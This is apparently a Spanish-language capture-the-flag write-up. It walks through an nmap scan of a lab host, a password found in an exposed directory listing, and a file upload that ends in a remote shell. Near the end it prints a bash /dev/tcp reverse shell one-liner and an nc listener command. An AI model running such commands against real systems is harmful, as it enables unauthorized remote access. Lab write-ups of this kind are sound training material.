


# Esacaneo de puertos y servicios
```bash
nmap -p- -Pn -sVCS --min-rate 5000 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 16:42 EDT
Nmap scan report for info.404-not-found.hl (172.17.0.2)
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Security Verification Tool
|_http-server-header: Apache/2.4.58 (Ubuntu)
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: Directory listing for /
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

veremos el servicio http abierto con dos puertos diferentes iremos a la web y veremos lo siguiente  

<img width="1279" height="758" alt="image" src="https://github.com/user-attachments/assets/7fe624b1-5821-439c-8112-4a2e207392bd" />

Realizamos un escaneo de subdirectorios, pero no encontramos nada. 

<img width="999" height="364" alt="image" src="https://github.com/user-attachments/assets/ef49c245-978b-4054-8dcc-c1a2d793aae1" />


Nos iremos al puerto 7777 que nos mostraba en el escaneo anteriormente veremos lo siguiente 

<img width="900" height="365" alt="image" src="https://github.com/user-attachments/assets/a616c174-9d17-4bee-ad5c-c6692f618815" />

Abrimos el .ssh y observamos un id_rsa. Pero ambos están vacíos.

<img width="620" height="215" alt="image" src="https://github.com/user-attachments/assets/b8775979-b358-4bd6-8c32-4ba2166cd510" />

Abrimos nota.txt y observamos lo siguiente.

<img width="362" height="101" alt="image" src="https://github.com/user-attachments/assets/4b1504c6-8a22-4016-b4e1-6df468734084" />

Vamos a secret y luego seleccionamos el archivo que tiene dentro, podemos observar que tiene un texto bastante interesante.

<img width="1279" height="449" alt="image" src="https://github.com/user-attachments/assets/d2ed037e-eebf-4af8-aa39-ca584964ff75" />

Leyendo un poco veremos un texto interesante 

<img width="238" height="77" alt="image" src="https://github.com/user-attachments/assets/2603e33c-1ed9-4a44-801b-5133a87bef06" />

```bash
super_secure_password
```

ingresaremos esto en la pagina principal que nos redirige con exito y veremos lo siguiente 

<img width="996" height="823" alt="image" src="https://github.com/user-attachments/assets/ada5ff3b-1e41-43ee-8204-35d582d3f0b5" />

aremos un texto de prueba 


<img width="578" height="512" alt="image" src="https://github.com/user-attachments/assets/06070957-abd5-49f4-b0e0-1fe8d1c940c9" />

Vamos al puerto 7777 podemos observar que el archivo se guarda en esta carpeta.

<img width="467" height="319" alt="image" src="https://github.com/user-attachments/assets/4f0f5309-3126-49c4-9438-ce40c31376f0" />

Probaremos establecer una shell por este medio, para ello crearemos un archivo

```bash
bash -i >& /dev/tcp/ip/port 0>&1
```

<img width="524" height="440" alt="image" src="https://github.com/user-attachments/assets/501a78ef-cd06-4575-901d-6736eb8520c9" />

nos pondremos en escucha con nc  

```bash
nc -lvnp port
```

Ingresamos el nombre del archivo y le damos en fetch configuration

<img width="505" height="213" alt="image" src="https://github.com/user-attachments/assets/dc367dc5-01a1-44b9-8180-4864d58f7ee7" />

Vamos a nuestro listener y podemos observar que ya obtuvimos acceso.
<img width="637" height="96" alt="image" src="https://github.com/user-attachments/assets/0a11eb9d-cba6-4a9d-bc68-f88866d53b63" />
